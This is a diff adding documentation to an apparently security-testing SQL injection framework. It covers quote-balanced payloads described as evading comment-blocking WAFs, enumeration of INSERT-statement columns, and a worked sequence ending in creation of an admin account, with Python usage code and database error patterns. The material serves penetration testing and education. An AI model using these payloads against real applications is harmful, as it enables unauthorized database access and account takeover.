@@ -235,6 +235,265 @@ if detected:
     print(f"Expected Result: {poc['expected_result']}")
 ```
 
+## Advanced SQL Injection Techniques
+
+### Quote Balancing Attacks
+
+Quote balancing is a technique that avoids SQL comment syntax (`--`, `#`) by carefully balancing quotes in the payload. This can bypass certain security filters that block comment markers.
+
+**Traditional Injection:**
+```sql
+-- Vulnerable query: SELECT * FROM users WHERE username = 'INPUT'
+-- Payload: admin' OR 1=1--
+-- Result: SELECT * FROM users WHERE username = 'admin' OR 1=1--'
+```
+
+**Quote-Balanced Injection:**
+```sql
+-- Vulnerable query: SELECT * FROM users WHERE username = 'INPUT'
+-- Payload: Wiley' OR 'a'='a
+-- Result: SELECT * FROM users WHERE username = 'Wiley' OR 'a'='a'
+```
+
+#### Benefits of Quote Balancing
+
+1. **Bypass Comment Filters**: Some WAFs and security filters block `--` and `#` patterns
+2. **Stealth**: Looks more like legitimate input
+3. **Compatibility**: Works across all SQL dialects without syntax variations
+
+#### Using Quote-Balanced Payloads
+
+```python
+from sql_attacker.injection_contexts.sql_context import SQLInjectionModule
+
+module = SQLInjectionModule()
+
+# Generate quote-balanced payloads
+quote_balanced = module._generate_quote_balanced_payloads("user")
+
+# Examples of generated payloads:
+# - "user' OR 'a'='a"
+# - "user' AND '1'='1' AND 'x'='x"
+# - "user" OR "key"="key"
+
+# These are automatically included in step1_supply_payloads
+payloads = module.step1_supply_payloads("testuser")
+# Now includes both traditional and quote-balanced variants
+```
+
+#### Detection Strategies
+
+The framework's enhanced response analysis can detect successful quote-balanced injections by:
+
+1. Monitoring for success indicators (e.g., "successfully inserted", "operation completed")
+2. Comparing response content length differences
+3. Analyzing timing variations
+
+### INSERT Statement Parameter Enumeration
+
+INSERT statement injections require a different approach than SELECT-based injections. The attacker must discover the correct number of parameters in the INSERT statement.
+
+**Vulnerable INSERT Statement:**
+```sql
+INSERT INTO users (username, email, role) VALUES ('INPUT', 'user@example.com', 'user')
+```
+
+#### Parameter Enumeration Strategy
+
+The framework implements progressive parameter enumeration to discover column counts:
+
+```python
+from sql_attacker.injection_contexts.sql_context import SQLInjectionModule
+
+module = SQLInjectionModule()
+
+# Generate INSERT-specific payloads
+insert_payloads = module._generate_insert_payloads("foo", max_params=5)
+
+# Generated payloads progressively add parameters:
+# 1. foo')--                      # Attempt to close VALUES clause
+# 2. foo', NULL)--                # Try 1 additional parameter
+# 3. foo', NULL, NULL)--          # Try 2 additional parameters
+# 4. foo', NULL, NULL, NULL)--    # Try 3 additional parameters
+# ... and so on
+```
+
+#### Example Attack Flow
+
+**Target Application:**
+```python
+# Vulnerable code
+username = request.POST['username']
+query = f"INSERT INTO users (username, email, role) VALUES ('{username}', 'new@example.com', 'user')"
+```
+
+**Attack Sequence:**
+
+1. **Initial Payload**: `foo')--`
+   - Error: "Column count doesn't match value count"
+   - Detection: INSERT injection confirmed
+
+2. **Enumerate Parameters**: `foo', NULL)--`
+   - Error: "Column count doesn't match value count"
+   - Detection: Not enough parameters yet
+
+3. **Continue**: `foo', NULL, NULL)--`
+   - Success or different error
+   - Detection: Found correct parameter count (3 columns total)
+
+4. **Craft Attack**: `admin', 'admin@evil.com', 'admin')--`
+   - Result: Admin user created
+
+#### Using INSERT Enumeration
+
+```python
+from sql_attacker.injection_contexts.sql_context import SQLInjectionModule
+
+module = SQLInjectionModule()
+
+# Method 1: Explicit INSERT statement type
+payloads = module.step1_supply_payloads(
+    "username",
+    statement_type="INSERT",
+    max_insert_params=10
+)
+
+# Method 2: Use flag for INSERT enumeration
+payloads = module.step1_supply_payloads(
+    "username",
+    include_insert_enum=True,
+    max_insert_params=8
+)
+
+# Test the payloads and analyze responses
+for payload in payloads:
+    # Send request with payload
+    response = send_request(payload)
+    
+    # Analyze response
+    detected, anomalies = module.step2_detect_anomalies(
+        response.text,
+        response.headers,
+        response.elapsed.total_seconds()
+    )
+    
+    if detected:
+        # Extract evidence
+        evidence = module.step3_extract_evidence(response.text, anomalies)
+        
+        # Check for INSERT context
+        if 'insert_detection' in evidence.get('context_info', {}):
+            insert_info = evidence['context_info']['insert_detection']
+            print(f"INSERT injection detected!")
+            print(f"Estimated parameters: {insert_info.get('parameter_count_hint')}")
+```
+
+#### Detection Patterns
+
+The framework detects INSERT-specific errors:
+
+**MySQL:**
+- "Column count doesn't match value count"
+- "Column count doesn't match value count at row 1"
+
+**PostgreSQL:**
+- "INSERT has more expressions than target columns"
+
+**MSSQL:**
+- "Column name or number of supplied values does not match table definition"
+
+**Oracle:**
+- "ORA-00913: too many values"
+- "ORA-00947: not enough values"
+
+#### Advanced INSERT Techniques
+
+**Quote-Balanced INSERT Injection:**
+```python
+# Combine quote balancing with INSERT enumeration
+payloads = [
+    "foo' OR 'a'='a') AND ('1'='1",
+    "foo', 1) OR ('x'='x",
+    "foo', 'test') AND 'key'='key",
+]
+```
+
+**Mixed Parameter Types:**
+```python
+# Test different data types to discover column types
+payloads = [
+    "foo', 1, 'test')--",           # String, Integer, String
+    "foo', 'admin', 'password')--",  # All strings
+    "foo', NULL, 1, 'test', 0)--",  # Mixed with NULL
+]
+```
+
+### Enhanced Response Analysis
+
+The framework now includes sophisticated response analysis for quote-balanced and INSERT injections:
+
+#### Features
+
+1. **INSERT Error Detection**: Identifies column count mismatch errors
+2. **Quote-Balance Success Detection**: Recognizes successful operations
+3. **Content Length Analysis**: Detects response size differences
+4. **Database-Specific Patterns**: Handles different DBMS error formats
+
+#### Usage Example
+
+```python
+module = SQLInjectionModule()
+
+# Response from potential INSERT injection
+response_body = "Error: wrong number of values in INSERT statement"
+
+# Detect anomalies with hint
+detected, anomalies = module.step2_detect_anomalies(
+    response_body,
+    response_headers={},
+    response_time=0.5,
+    payload_hint="INSERT"
+)
+
+if detected:
+    # Extract detailed evidence
+    evidence = module.step3_extract_evidence(response_body, anomalies)
+    
+    print(f"Confidence: {evidence['confidence']}")
+    print(f"Database: {evidence['context_info'].get('database_type')}")
+    
+    if 'insert_detection' in evidence['context_info']:
+        insert_info = evidence['context_info']['insert_detection']
+        print(f"Statement Type: {insert_info['statement_type']}")
+        print(f"Parameter Hint: {insert_info['parameter_count_hint']}")
+```
+
+### Usage Strategy and Limitations
+
+#### Best Practices
+
+1. **Progressive Testing**: Start with basic payloads, then use specialized techniques
+2. **Context-Aware**: Use `statement_type` parameter when you know the SQL statement type
+3. **Parameter Limits**: Set reasonable `max_insert_params` (typically 5-15) to avoid excessive requests
+4. **Response Analysis**: Always analyze responses carefully for subtle indicators
+
+#### Limitations
+
+1. **Blind INSERT Injection**: May require additional techniques like time-based or out-of-band detection
+2. **Complex Queries**: Multi-table INSERT or INSERT...SELECT may require manual analysis
+3. **WAF Evasion**: Some advanced WAFs may still detect these patterns
+4. **False Positives**: Generic error messages may require manual verification
+
+#### Detection Logic Refinement
+
+**Tips for improving detection accuracy:**
+
+1. **Baseline Comparison**: Always establish a baseline response before testing
+2. **Multiple Attempts**: Test several parameter counts to identify patterns
+3. **Error Message Analysis**: Look for specific column count hints in errors
+4. **Success Indicators**: Monitor for creation confirmations or redirects
+5. **Combined Techniques**: Use both quote-balancing and traditional methods
+
 ## Extending the Framework
 
 ### Creating a New Injection Module
